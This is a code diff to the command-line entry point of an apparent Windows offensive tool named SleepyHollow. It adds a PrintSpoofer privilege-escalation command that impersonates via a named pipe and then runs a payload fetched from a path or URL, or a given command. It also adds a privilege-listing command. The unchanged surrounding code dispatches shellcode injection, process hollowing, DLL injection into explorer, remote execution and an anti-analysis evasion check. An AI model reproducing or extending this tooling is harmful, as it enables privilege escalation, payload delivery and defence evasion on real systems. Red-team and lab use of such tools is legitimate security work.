@@ -1,8 +1,17 @@
 using SleepyHollow;
-
 #if !HEADLESS
 var commands = new Dictionary<string, Dictionary<string, string>>
 {
+    { "user", new Dictionary<string, string>() },
+    {
+        "printspoofer",
+        new Dictionary<string, string>
+        {
+            { "pipe", "name of pipe to" },
+            { "payload", "path/URL to payload (ignored if --cmd is used)" },
+            { "cmd", "command to execute after impersonation (optional)" }
+        }
+    },
     {
         "sc",
         new Dictionary<string, string>
@@ -85,6 +94,32 @@ if (!skipEvasion && EvasionCheck.Detected)
 
 switch (options["command"])
 {
+    case "user":
+        var privileges = UserHelper.CheckPrivileges();
+        Console.WriteLine($"User: {UserHelper.GetUserName(), 43}");
+        Console.WriteLine($"IsAdmin: {UserHelper.IsAdmin(), 40}");
+        if (!UserHelper.IsAdmin())
+        {
+            Console.WriteLine($"CanElevate: {UserHelper.IsMemberOfAdministrators(), 37}");
+        }
+        Console.WriteLine("Privileges:");
+        foreach (var kvp in privileges)
+        {
+            Console.WriteLine($"  {kvp.Key, -35}: {(kvp.Value ? "Enabled" : "Disabled"), 10}");
+        }
+        break;
+    case "printspoofer":
+        var pipeName = options.ContainsKey("pipe") ? options["pipe"] : "\\\\.\\pipe\\test\\pipe\\spoolss";
+        var payloadUrl = options.ContainsKey("payload") ? options["payload"] : null;
+        var executeCmd = options.ContainsKey("cmd") ? options["cmd"] : null;
+        if (payloadUrl == null && executeCmd == null)
+        {
+            Console.WriteLine("Either --payload or --cmd must be specified");
+            Environment.Exit(1);
+        }
+
+        PrintSpoofer.Spoof(pipeName, payloadUrl, executeCmd);
+        break;
     case "sc":
         var url = options["payload"];
         var method = options.ContainsKey("method") ? options["method"] : "hollow";
@@ -108,7 +143,7 @@ switch (options["command"])
         break;
     case "dll":
         var dllName = options["path"];
-        var processName =  options.ContainsKey("processName") ? options["processName"] : "explorer";
+        var processName = options.ContainsKey("processName") ? options["processName"] : "explorer";
         await InjectDLL.Run(dllName, processName);
         break;
     case "rexec":
@@ -143,5 +178,3 @@ await InjectProcess.Run(buf);
 await HollowProcess.Run(buf);
 #endif
 #endif
-
-
